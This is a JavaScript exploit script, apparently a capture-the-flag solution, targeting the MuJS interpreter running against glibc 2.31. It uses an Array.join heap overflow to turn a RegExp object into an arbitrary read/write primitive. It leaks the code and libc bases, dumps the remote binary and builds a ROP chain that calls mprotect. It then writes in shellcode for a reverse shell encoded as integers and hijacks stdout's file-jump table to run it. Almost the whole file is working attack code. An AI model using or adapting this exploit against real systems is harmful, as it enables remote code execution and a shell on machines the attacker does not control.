function u64(string){
    var num = 0;
    for(var i=7;i>=0;i--){
      num*=256;
      num+=string.charCodeAt(i);
    }
    return num;
}

function hex(num){
    return "0x"+num.toString(16);
}

function read32(addr,master,slave){
    //set slave data buffer to target address
    master.edit(0x128,addr%0x100000000);
    master.edit(0x12c,addr/0x100000000);
    //read from slave data buffer
    return slave.getUint32(0);
}

function read64(addr,master,slave){
    return read32(addr,master,slave)+read32(addr+4,master,slave)*0x100000000;
}

function write32(addr,value,master,slave){
    //set slave data buffer to target address
    master.edit(0x128,addr%0x100000000);
    master.edit(0x12c,addr/0x100000000);
    //write to slave data buffer
    slave.setUint32(0,value);
}

function write64(addr,value,master,slave){
    write32(addr,value%0x100000000,master,slave);
    write32(addr+4,value/0x100000000,master,slave);
}

function write32_batch(addr,values,master,slave){
    for(var i=0;i<values.length;i++){
        write32(addr+i*4,values[i],master,slave);
    }
}

function write64_batch(addr,values,master,slave){
    for(var i=0;i<values.length;i++){
        write64(addr+i*8,values[i],master,slave);
    }
}

function exfiltrate(base_addr,orientation,length,master,slave){
    //orientation is +-1, indicating the direction to read
    //length should be a mutliple of 0x4, since we aare reading 4 bytes at a time
    if(orientation==-1){
        base_addr-=length;
    }
    for(var offset=0;offset<length;offset+=4){
        print(read32(base_addr+offset,master,slave));
    }
}

function main(){
    //Addr
    //libc2.31
    var sentinel_offset = 0x4e1e0;
    var bss_offset = 0x4ea00;
    var getpwnam_got_offset = 0x4ced0;
    var getpwnam_offset = 0xe4740;
    var stdout_struct_offset = 0x1ec6a0;
    var stdout_readptr_offset = stdout_struct_offset+0x8;
    var IO_file_jumps_offset = 0x1ed4a0;
    var IO_file_jumps_write_offset = IO_file_jumps_offset+0x78;

    //ROPgadget
    var L_nop = 0x3491f;
    var L_pop_rdi = 0x26b72;
    var L_pop_rsi = 0x27529;
    var L_pop_rdx_rbx = 0x1626d6;
    var L_pop_rax = 0x4a550;
    var L_syscall = 0x66229;
    var L_trampoline = 0x1547a0; //mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20] ;
    var L_setcontext = 0x580dd;

    //Exploit
    //Taking advantage of MuJS storing arrays items as individual properties and set index==strlen
    var STRING=[];
    var cnt = 1;
    STRING[cnt] = "P";
    for(var i=0;i<16;i++){
        STRING[cnt*2] = STRING[cnt]+STRING[cnt];
        cnt*=2;
    }

    //prepare array to join and trigger overflow
    var overflower = [STRING[0x10000].slice(0x81+1),
                      STRING[0x40]+STRING[0x80]+"\x11"];

    //From this point on, we need to be careful with heap layout
    //Spay chunks onto 0x80 zone to fill those dangling chunks, so that we will have a contiguous heap to work on
    var spray=[];
    for(var i=0;i<1000;i++){
        spray.push(STRING[0x40]);
    }

    //Create slave, master in correct order
    var slave = DataView(8);
    var master = RegExp(STRING[0x40]);

    //trigger overflow and overwrite master.type
    overflower.join("");

    //Layout sensitive objects are all put in place, we don't need to care about heap layout anymore
    master.edit = DataView.prototype.setUint32;
    master.show = DataView.prototype.getUint32;

    //Save slave buffer address for restore
    var original_slave_buffer = master.show(0x128)+master.show(0x12c)*0x100000000;

    //exfiltrate first remote binary and analyze statically before doing the later steps
    //+1 to Challenge.exec() is to make it 4 bytes aligned
    //The code used to parse runtime memory dump to IDA recognizable ELF can be found in my github repo
    exfiltrate(Challenge.exec()+1,-1,0x8040,master,slave);
    exfiltrate(Challenge.exec()+1,1,0x42fc0,master,slave);
    exfiltrate(Challenge.exec()+1+0x43fc0,1,0x3000,master,slave);

    //Leak code base
    var sentinel_addr = master.show(0x108)+master.show(0x10c)*0x100000000;
    var code_base = sentinel_addr-sentinel_offset;
    print(hex(code_base));

    //Leak libc base
    var getpwnam_addr = read64(code_base+getpwnam_got_offset,master,slave);
    var libc_base = getpwnam_addr-getpwnam_offset;
    print(hex(libc_base));

    //Stub and ROPchain to perform mprotect and jumps onto shellcode
    var stub = [0, 0, 0, 0,
	        libc_base+L_setcontext, 0, 0, 0,
	        0, 0, 0, 0,
	        0, 0, 0, 0,
	        0, 0, 0, 0,
	        code_base+bss_offset+0xb0, libc_base+L_nop];
    var ROPchain = [libc_base+L_pop_rdi, code_base+(bss_offset&0xff000),
                    libc_base+L_pop_rsi, 0x1000,
                    libc_base+L_pop_rdx_rbx, 7, 0,
                    libc_base+L_pop_rax, 10,
                    libc_base+L_syscall,
                    code_base+bss_offset+0x108];
    var payload = stub.concat(ROPchain);
    write64_batch(code_base+bss_offset,payload,master,slave);

    //A simple reverse shell that supports ls, cat, exit
    //Source assembly can be found in my github repo
    var minimal_reverse_shell = [46647112,1207959552,116423,3343384576,194,3234285568,41,2303264015,3284617412,0,2361622856,1210434160,1209066433,1965540225,3242721280,2202538211,1280508611,2303256457,3267840230,16,717277000,251658240,3351726085,0,611618121,3234285569,33,3343385871,455,1955416320,3343385124,8640,1275399936,3343443849,198,3234285568,33,3343385871,454,3234285568,33,2917729551,1224736770,3343514761,197,3351726080,0,1223067980,115399,3343384576,192,1090850560,170146944,4282978676,3321842116,4278026569,1946157071,1104079618,2360518,608486977,2303459329,3343434728,192,121405440,1208316928,4125868287,541032643,1959264072,3489614072,3287845192,3301394782,0,1960065353,747259416,881477159,3305064742,1962227781,3234285803,0,3234285763,1,4220078275,3906963784,66,33063752,3343386741,448,2303247104,3926239,2202533888,141885944,46188360,3271557120,3906963784,51,33063752,3343386741,960,3343434496,4294967232,3343434751,962,4286244864,1633943551,3267840116,2,4294929384,1215524095,312007,1575485440,1711276031,1601464696,16745288,2303206260,3750316283,4294911464,3263777023,29869896,1207959552,3343441545,448,3942977280,1208642262,116679,2303197184,3267840230,1,29411144,251658240,1220762373,2303261577,3334949087,0,12765000,1207959552,180423,84869120,16286536,2303278204,3884534980,1222543688,16827079,3343384576,192,1225068288,3343435145,455,3733538816,1223330124,114887,84869120,16613705,1946157057,6996936,4283557971,1633943551,1768300660,1696621932,1919906418,2112032,1224444232,3343441801,16777414,3267840000,0,46188360,251658240,4169353221,2374766336,1224736768,2303509641,3012380903,256,12765000,1207959567,5161159,84869120,16286536,1735682684,1237682505,50887,2370568192,65723,3996732672,2370422909,199758463,1224736766,2370421385,3343389303,455,3234285568,1,174720271,1223067976,116679,3343384576,450,3234285568,1,1214121231,49351,1097203712,1225803659,21612289,3282758598,3897753706,4294966915,1696625516,1919906418,2112032,13092680,1207959552,3981511,84869120,13092680,1207959552,268486343,3343384576,1986,3267840256,34,4294948937,65535,3343450112,193,3234285568,9,2303198479,4018751685,4294775528,4169353471,1209367552,2666065801,1224736765,1979709571,6416419,3723165696,1512,4287293440,7012351,4294834920,1634030335,1919230052,7499634,33063752,2370311029,719848575,1224736765,552126345,3959422974,4169353384,1210021122,3892542861,4294966545,1962948736,771802631,82118,3905390920,4294966900,904430571,1795162111,4255508480,1852637183,1768710518,1868767332,1851878765,100];
    write32_batch(code_base+bss_offset+0x108,minimal_reverse_shell,master,slave);

    //Hijack IO_file_jumps function pointer to trigger throught stdout IO_WRITE
    var trampoline = libc_base+L_trampoline;
    var pivot = code_base+bss_offset;
    write64(libc_base+stdout_readptr_offset,code_base+bss_offset,master,slave);
    write64(libc_base+IO_file_jumps_write_offset,libc_base+L_trampoline,master,slave);
    print("get shell");

    //Restore slave buffer address so process doesn't crash upon cleanup, and allow process to end gracefully
    master.edit(0x128,original_slave_buffer%0x100000000);
    master.edit(0x12c,original_slave_buffer/0x100000000);
}

main();
